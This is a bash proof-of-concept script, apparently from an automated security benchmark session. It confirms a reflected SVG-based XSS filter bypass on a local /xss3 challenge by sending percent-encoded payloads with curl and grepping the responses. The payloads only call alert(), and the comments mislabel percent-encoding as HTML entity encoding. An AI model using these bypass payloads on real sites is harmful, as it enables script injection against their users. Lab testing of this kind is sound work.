#!/bin/bash
# POC: Demonstrates SVG-based context breakout XSS in /xss3 by bypassing the < > filter using HTML entity encoding (%3C %3E) which are decoded before the filter check
# Target: ./repo
# Created: 2025-11-06T21:42:55.679Z
# Session: benchmark-XBEN-062-24-mhnxw89p

# SVG-based Context Breakout XSS in XSS Challenge #3
# Vulnerability: Filter only checks for literal < and > characters
# HTML-entity encoded angle brackets (%3C and %3E) bypass the filter
# These are decoded during URL processing before reaching the filter check

TARGET="${1:-http://localhost:5001}"
ENDPOINT="/xss3"

echo "[*] Testing SVG Context Breakout XSS in /xss3"
echo "[*] Target: ${TARGET}${ENDPOINT}"
echo ""

# Test 1: Basic SVG element injection with onload event
echo "[TEST 1] SVG element injection with onload event handler"
echo "Payload: \">‹svg onload=\"alert(1)"
PAYLOAD='%22%3E%3Csvg%20onload=%22alert(1)'
URL="${TARGET}${ENDPOINT}?name=${PAYLOAD}"
echo "URL: $URL"
echo ""

RESPONSE=$(curl -s "$URL")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if SVG element is present in response
if echo "$RESPONSE" | grep -q "<svg"; then
    echo "[✓] SUCCESS: SVG element was injected into HTML"
    
    # Check if onload handler is present
    if echo "$RESPONSE" | grep -q "onload="; then
        echo "[✓] SUCCESS: onload event handler was injected"
        echo "[✓] VULNERABILITY CONFIRMED: Context breakout XSS via SVG element"
    else
        echo "[✗] FAILED: onload handler not found in response"
        exit 1
    fi
else
    echo "[✗] FAILED: SVG element not found in response"
    echo "This indicates the filter may be blocking or encoding the content"
    exit 1
fi

echo ""
echo "[TEST 2] Verify filter bypass mechanism"
echo "Testing that literal < and > are blocked but encoded versions bypass"
echo ""

# Test with literal angle brackets (should be blocked)
echo "Testing with literal < character:"
LITERAL_PAYLOAD='"><script>alert(1)</script>'
URL_LITERAL="${TARGET}${ENDPOINT}?name=${LITERAL_PAYLOAD}"
RESPONSE_LITERAL=$(curl -s "$URL_LITERAL")

if echo "$RESPONSE_LITERAL" | grep -q "<script>"; then
    echo "[✗] Literal script tag NOT blocked - filter not working"
else
    echo "[✓] Literal < and > characters are filtered"
fi

echo ""
echo "[TEST 3] Alternative SVG injection vectors"
echo "Testing onerror event handler"
PAYLOAD_ONERROR='%22%3E%3Csvg%20onerror=%22alert(2)'
URL_ONERROR="${TARGET}${ENDPOINT}?name=${PAYLOAD_ONERROR}"
RESPONSE_ONERROR=$(curl -s "$URL_ONERROR")

if echo "$RESPONSE_ONERROR" | grep -q "onerror="; then
    echo "[✓] SVG onerror handler also injectable"
else
    echo "[⚠] onerror handler not injected"
fi

echo ""
echo "[TEST 4] Context breakout demonstration"
echo "Verifying that SVG is at same HTML level as input element (context breakout)"
echo "URL: ${TARGET}${ENDPOINT}?name=%22%3E%3Csvg%20onload=%22alert(1)"
echo ""

RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=%22%3E%3Csvg%20onload=%22alert(1)")

# Extract the relevant portion showing the injection
echo "Injected HTML structure:"
echo "$RESPONSE" | grep -o "<input[^>]*>.*<svg[^>]*>" || echo "$RESPONSE" | grep -o "<svg[^>]*>"

echo ""
echo "[✓] VULNERABILITY CONFIRMED"
echo "Summary:"
echo "  - HTML-entity encoded angle brackets (%3C, %3E) bypass the < > filter"
echo "  - Decoding happens before or during filter check"
echo "  - SVG elements can be injected with event handlers"
echo "  - Complete context breakout is possible"
echo "  - Arbitrary HTML/SVG elements can be injected"